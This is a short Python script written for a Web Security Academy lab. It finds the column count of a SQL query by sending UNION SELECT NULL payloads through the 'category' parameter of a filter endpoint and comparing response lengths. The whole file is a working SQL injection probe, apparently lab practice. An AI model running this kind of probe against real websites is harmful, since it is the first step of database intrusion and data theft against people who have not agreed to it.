# determine how many columns are being return from the original query

import requests

url = "https://0a2d007d03d9308180bd855400cf006b.web-security-academy.net/filter"

# calculate standard len for query
st_len = len(requests.get(url, {"category":"test"}).text) 


lenght=1

while(1):
    print(f"trying {lenght}")

    payload = ("NULL,"*lenght)[:-1]

    l = requests.get(url, {"category":"' Union SELECT "+payload+"-- -"}).text
    l=len(l)

    if(l<st_len):
        lenght = lenght+1
    else:
        break


print(f"number of columns is {lenght}")



